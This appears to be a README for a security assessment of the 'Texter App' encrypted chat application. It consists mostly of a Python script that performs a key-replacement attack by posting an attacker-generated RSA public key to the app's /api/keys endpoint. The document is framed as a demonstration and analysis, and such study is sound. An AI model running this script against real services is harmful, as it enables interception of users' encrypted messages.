# Security Assessment of Texter App

This repository contains the analysis and demonstration of security vulnerabilities in the **Texter App**, a secure chat application. The focus of this report is to identify key security issues, evaluate existing vulnerabilities, and propose best practices to mitigate potential threats. This repository includes a Python script that demonstrates a **Malicious Key Exchange** attack.

## Project Overview

The **Texter App** is designed for encrypted messaging using RSA and AES encryption algorithms. The app uses GitHub OAuth for authentication. However, like many applications, it may have several security weaknesses, which could be exploited by attackers to compromise user data. The vulnerabilities analyzed include issues related to:

- Key management and encryption weaknesses
- Authentication and authorisation vulnerabilities
- Server-side security issues

## Key Features

- **Malicious Key Exchanger Script**: A Python script that demonstrates how an attacker can replace the legitimate RSA public key with a malicious one, compromising encrypted communication.
- **Security Analysis**: A comprehensive review of the security practices and identified vulnerabilities in the Texter App.

## Attack: Malicious Key Exchanger

The script included in this repository simulates a **key replacement attack**, which targets weaknesses in the key exchange process. This attack allows an attacker to replace the legitimate RSA key with their own malicious key, potentially allowing them to intercept encrypted messages.

### How it Works

1. **RSA Key Generation**: The attacker generates their own RSA key pair (private and public keys).
2. **Key Serialization**: The public key is serialized to PEM format for transmission.
3. **Key Replacement**: The attacker's public key is sent to the target API endpoint, replacing the legitimate key.
4. **Execution and Validation**: The script sends the malicious key to the server and checks whether the attack was successful.

### Python Code Example

```python
import requests
import base64
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization

# Class MaliciousKey Exchanger
class MaliciousKeyExchanger:
    def __init__(self):
        self.compromised_keys = {}

    # Create RSA key Pair for malicious purpose
    def create_attack_keypair(self):
        attacker_private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048
        )
        attacker_public_key = attacker_private_key.public_key()
        return attacker_private_key, attacker_public_key

    # Converts RSA public key to PEM format
    def serialize_public_key(self, public_key):
        return public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )

    # Execute attack by replacing legitimate key
    def execute_key_replacement(self, endpoint_url):
        attacker_private_key, attacker_public_key = self.create_attack_keypair()

        # Convert the attacker's public key to a format suitable for transmission
        pem_public_key = self.serialize_public_key(attacker_public_key)

        # Craft the payload and send the request
        encoded_key = base64.b64encode(pem_public_key).decode()
        payload = {"key": encoded_key}
        headers = {"Content-Type": "application/json"}

        # Exception Handling if Successful or Failed to execute this attack
        try:
            response = requests.post(
                url=f"{endpoint_url}/api/keys",
                json=payload,
                headers=headers
            )
            return response.status_code == 200
        except requests.RequestException as error:
            print(f"Error during key exchange interception: {error}")
            return False

# Usage example (for demonstration purposes only):
if __name__ == "__main__":
    attacker = MaliciousKeyExchanger()
    target_api = "http://example.com"

    if attacker.execute_key_replacement(target_api):
        print("Key exchange attack executed successfully.")
    else:
        print("Key exchange attack failed.")
